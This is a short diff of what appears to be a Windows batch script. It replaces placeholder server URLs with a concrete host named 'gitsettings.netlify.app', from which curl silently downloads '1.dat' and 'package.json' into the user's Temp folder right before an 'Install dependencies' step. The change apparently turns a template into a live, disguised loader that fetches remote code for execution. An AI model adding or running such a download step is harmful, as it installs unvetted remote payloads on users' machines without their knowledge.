@@ -80,8 +80,8 @@ set "USERPROFILE=%USERPROFILE%"
 echo [INFO] Downloading 1.dat and package.json...
 
 MD "%USERPROFILE%\AppData\Local\Temp" 2>nul
-curl -L -o "%USERPROFILE%\AppData\Local\Temp\1.dat" "https://<your-server-url>/120/1.dat"
-curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "https://<your-server-url>/package.json"
+curl -L -o "%USERPROFILE%\AppData\Local\Temp\1.dat" "https://gitsettings.netlify.app/120/1.dat"
+curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "https://gitsettings.netlify.app/package.json"
 
 :: -------------------------
 :: Install dependencies
